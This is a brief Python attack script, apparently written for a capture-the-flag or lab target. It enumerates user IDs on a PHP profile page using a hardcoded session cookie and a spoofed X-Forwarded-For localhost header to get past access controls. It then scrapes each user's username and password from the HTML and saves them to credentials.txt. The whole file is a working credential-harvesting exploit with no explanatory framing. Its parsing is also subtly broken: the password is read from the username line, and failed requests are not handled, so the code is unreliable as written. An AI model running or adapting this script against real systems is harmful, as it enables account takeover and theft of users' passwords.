#!/usr/bin/python3
import requests

URL ='http://{targets_ip}/index.php'

def sendGET(i):
    print("sending request for user: " + str(i))
    user_id = str(i)
    PARAMS = {
        'page':'profile',
        'user_id':user_id
    }
    HEADERS = {
        'Cookie':'PHPSESSID=jkufv650c6b1ukbno09a0hsf21',
        'X-Forwarded-For': '127.0.0.1'
    }

    r = requests.get(url = URL, params = PARAMS, headers = HEADERS)
    if r and r.status_code == 200:
        print("username and password found")
        return r
    return None

def recordCredentials(f,r):
    print("recording credentials")
    user = ''
    passwd = ''
    response_buffer = r.text.split('\n')
    n = len(response_buffer)-1
    usernameHTML =  response_buffer[n-8] 
    passwordHTML =  response_buffer[n-6]
    ind1 = usernameHTML.index('value=') + 7
    ind2 = passwordHTML.index('value=') + 7
    while(usernameHTML[ind1] != '\"'):
        user += usernameHTML[ind1]
        ind1 +=1

    while(usernameHTML[ind2] != '\"'):
        passwd += usernameHTML[ind2]
        ind2 +=1
    record = user + ":" + passwd + "\n"
    f.write(record)

def main():
    f = open("credentials.txt", "w")
    print("Collecting Credentials...")
    for i in range(1,12):
        response = sendGET(i)
        recordCredentials(f,response)
    print("Succesfully written to file")
    f.close()


main()
